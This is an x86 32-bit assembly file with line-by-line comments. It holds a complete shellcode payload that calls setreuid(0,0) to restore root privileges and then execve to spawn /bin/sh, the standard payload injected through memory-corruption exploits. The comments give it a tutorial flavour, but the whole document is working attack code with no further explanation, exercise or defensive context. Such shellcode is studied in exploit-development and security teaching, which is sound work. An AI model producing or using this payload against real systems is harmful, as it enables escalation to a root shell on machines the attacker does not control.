BITS 32
;setreuid(uid_t ruid, uid_t euid)
push byte 70		;push the byte value 70 to the stack
pop eax				;pop the 4-byte word 70 from the stack
xor ebx, ebx		;put 0 into the ebx, set real uid to root
xor ecx, ecx		;put 0 into ecx, to set effective uid to root
int 0x80

;execve(const char *filename, char *const argv[], char *const envp[])
push ecx			;push 4 bytes of null from ecx to the stack
push 0x68732f2f		;push //sh to the stack
push 0x6e69622f		;push /bin to the stack
mov ebx, esp		;put the address of "/bin//sh" to the ebx, via esp
push ecx			;push 4 bytes of null from ecx to the stack
push ebx			;push ebx to the stack
mov ecx, esp		;put the address of the ebx to ecx to the stack
cdq					;put 0 into edx using the signed bit from eax
mov al, 11			;put 11 into eax, since execve() is syscall #11
int 0x80
